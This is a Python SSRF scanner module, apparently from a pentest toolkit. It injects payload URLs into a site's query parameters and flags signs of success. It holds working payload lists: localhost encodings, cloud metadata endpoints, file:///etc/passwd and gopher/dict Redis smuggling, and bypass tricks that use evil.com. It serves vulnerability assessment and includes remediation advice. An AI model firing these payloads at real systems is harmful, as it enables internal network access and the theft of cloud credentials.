"""
SSRF (Server-Side Request Forgery) scanner — detect when the server can be
tricked into making requests to internal/arbitrary destinations.
"""

import re
import sys
import os
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.http import HTTPClient
from utils.reporter import Finding

# Parameters commonly vulnerable to SSRF
SSRF_PARAMS = [
    "url", "uri", "path", "dest", "redirect", "next", "data", "reference",
    "site", "html", "val", "validate", "domain", "callback", "return",
    "page", "feed", "host", "port", "to", "out", "view", "dir",
    "show", "navigation", "open", "file", "document", "folder",
    "pg", "php_path", "style", "img", "filename", "preview",
    "window", "link", "src", "source", "target", "proxy", "request",
    "fetch", "load", "download", "image", "avatar", "icon",
    "webhook", "callback_url", "ping", "api", "endpoint",
]

# Payloads targeting internal services
INTERNAL_PAYLOADS = [
    # Localhost variations
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://0177.0.0.1",       # Octal
    "http://2130706433",        # Decimal
    "http://0x7f000001",        # Hex
    "http://127.1",
    "http://127.0.0.1.nip.io",

    # Cloud metadata endpoints
    "http://169.254.169.254/latest/meta-data/",           # AWS
    "http://169.254.169.254/metadata/v1/",                 # DigitalOcean
    "http://metadata.google.internal/computeMetadata/v1/", # GCP
    "http://169.254.169.254/metadata/instance",            # Azure

    # Internal services
    "http://127.0.0.1:22",
    "http://127.0.0.1:3306",
    "http://127.0.0.1:6379",
    "http://127.0.0.1:9200",
    "http://127.0.0.1:27017",
    "http://127.0.0.1:8080",
    "http://127.0.0.1:8443",

    # Protocol smuggling
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_INFO",
]

# Bypass payloads when basic SSRF is filtered
BYPASS_PAYLOADS = [
    # URL encoding
    "http://127.0.0.1/%2f",
    "http://127.0.0.1/%09",

    # DNS rebinding style
    "http://localtest.me",
    "http://spoofed.burpcollaborator.net",

    # Redirect-based
    "https://httpbin.org/redirect-to?url=http://127.0.0.1",

    # URL fragment/auth tricks
    "http://evil.com@127.0.0.1",
    "http://127.0.0.1#@evil.com",
    "http://127.0.0.1%23@evil.com",

    # Enclosed alphanumeric
    "http://①②⑦.⓪.⓪.①",
]

# Indicators that SSRF worked
SSRF_INDICATORS = {
    "localhost_html": [r"<title>.*(?:Apache|nginx|IIS|Welcome|Index)", r"It works!"],
    "cloud_metadata": [r"ami-id", r"instance-id", r"local-ipv4", r"meta-data", r"availabilityZone"],
    "internal_service": [r"Redis", r"MongoDB", r"mysql", r"SSH-", r"OpenSSH", r"Elasticsearch"],
    "file_read": [r"root:.*:0:0:", r"\[fonts\]", r"\[extensions\]", r"\\Windows\\"],
    "error_based": [r"Connection refused", r"No route to host", r"Name or service not known"],
    "time_based": [],  # detected by response time difference
}


def detect_ssrf_indicators(body):
    """Check response for signs of SSRF success."""
    results = []
    for category, patterns in SSRF_INDICATORS.items():
        for pattern in patterns:
            if re.search(pattern, body, re.IGNORECASE):
                results.append((category, pattern))
    return results


def test_existing_params(url, client, verbose=True):
    """Test existing URL parameters for SSRF."""
    findings = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    ssrf_candidates = [p for p in params if p.lower() in SSRF_PARAMS]

    for param in ssrf_candidates:
        if verbose:
            print(f"    Testing param: {param}", flush=True)

        # Get baseline
        baseline = client.get(url)
        baseline_time = 0

        for payload in INTERNAL_PAYLOADS[:10]:  # Top payloads
            test_params = dict(params)
            test_params[param] = [payload]
            query = urlencode(test_params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query, ""))

            start = time.time()
            resp = client.get(test_url)
            elapsed = time.time() - start

            if not resp:
                continue

            indicators = detect_ssrf_indicators(resp.text)

            if indicators:
                sev = "critical" if any("cloud_metadata" in i[0] or "file_read" in i[0] for i in indicators) else "high"
                findings.append(Finding(
                    title=f"SSRF in '{param}' parameter",
                    severity=sev,
                    description=f"Parameter '{param}' is vulnerable to SSRF. Server made request to: {payload}",
                    url=test_url,
                    evidence=(
                        f"Payload: {payload}\n"
                        f"Indicators: {', '.join(f'{i[0]}:{i[1]}' for i in indicators[:3])}"
                    ),
                    remediation=(
                        "Validate and sanitize URLs. Use an allowlist of permitted domains. "
                        "Block requests to internal IPs (127.0.0.1, 169.254.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x). "
                        "Disable unnecessary URL schemes (file://, gopher://, dict://)."
                    ),
                ))
                if verbose:
                    print(f"      [SSRF FOUND] {payload} -> {indicators[0]}")
                return findings

            # Check for response differences that suggest internal access
            if baseline and abs(len(resp.content) - len(baseline.content)) > 500:
                if resp.status_code != baseline.status_code or elapsed > 3:
                    findings.append(Finding(
                        title=f"Potential SSRF in '{param}' parameter",
                        severity="medium",
                        description=f"Parameter '{param}' shows different behavior with internal URL payload.",
                        url=test_url,
                        evidence=(
                            f"Payload: {payload}\n"
                            f"Response size diff: {abs(len(resp.content) - len(baseline.content))}\n"
                            f"Status: {resp.status_code} (baseline: {baseline.status_code})\n"
                            f"Time: {elapsed:.2f}s"
                        ),
                        remediation="Investigate and validate URL parameters server-side.",
                    ))

    return findings


def fuzz_params(url, client, verbose=True):
    """Try adding SSRF-prone parameters to the URL."""
    findings = []
    parsed = urlparse(url)

    for param in SSRF_PARAMS[:15]:  # Top params
        for payload in ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"]:
            test_params = {param: payload}
            query = urlencode(test_params)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", query, ""))

            resp = client.get(test_url)
            if not resp:
                continue

            indicators = detect_ssrf_indicators(resp.text)
            if indicators:
                findings.append(Finding(
                    title=f"SSRF via added '{param}' parameter",
                    severity="high",
                    description=f"Adding '{param}' parameter with internal URL triggers SSRF.",
                    url=test_url,
                    evidence=f"Payload: {payload}\nIndicators: {indicators[:3]}",
                    remediation="Validate all URL-type parameters. Block internal network access.",
                ))
                if verbose:
                    print(f"    [SSRF] ?{param}={payload}")
                break

    return findings


def scan_url(url, verbose=True):
    """Full SSRF scan on a URL."""
    client = HTTPClient(rate_limit=0.5, timeout=15, retries=1)
    findings = []

    findings.extend(test_existing_params(url, client, verbose))
    findings.extend(fuzz_params(url, client, verbose))

    return findings


def scan_multiple(urls, verbose=True):
    all_findings = []
    for url in urls:
        if verbose:
            print(f"  [{url[:80]}] testing SSRF...", flush=True)
        all_findings.extend(scan_url(url, verbose))
    return all_findings


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python ssrf.py <url>")
        sys.exit(1)
    url = sys.argv[1]
    print(f"\n[*] SSRF scan: {url}\n")
    findings = scan_url(url)
    if not findings:
        print("\n  No SSRF found")
